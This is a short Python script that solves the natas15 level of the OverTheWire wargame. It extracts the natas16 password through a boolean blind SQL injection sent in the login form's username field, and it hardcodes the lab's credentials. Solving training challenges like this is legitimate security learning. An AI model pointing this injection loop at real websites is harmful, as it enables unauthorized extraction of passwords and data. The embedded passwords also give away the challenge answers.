#!/bin/usr/bin/python3

import requests
import string

chars='123456789'+ string.ascii_uppercase + string.ascii_lowercase
url = 'http://natas15.natas.labs.overthewire.org/index.php'
username='natas15'
password_15='TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'
password_16_1="TrD7IZrD5GatJj9PkpEUaoLfEJhqJ32V"
password_16=""
while len(password_16) <= 33 :
    for i in chars:
        print("Testing " + i+ ":")
        query='natas16" AND password LIKE binary "' +password_16 + i +'%" #'
        print("     " + query)
        #use the 'auth' parameter to send requests with HTTP Basic Auth:
        x = requests.post(url, data ={"username":query}, auth = (username,password_15))
        print(x.status_code)

        if "This user exists" in x.text: 
            password_16+=i
            print(i+" was another chars")
            break

print(password_16)
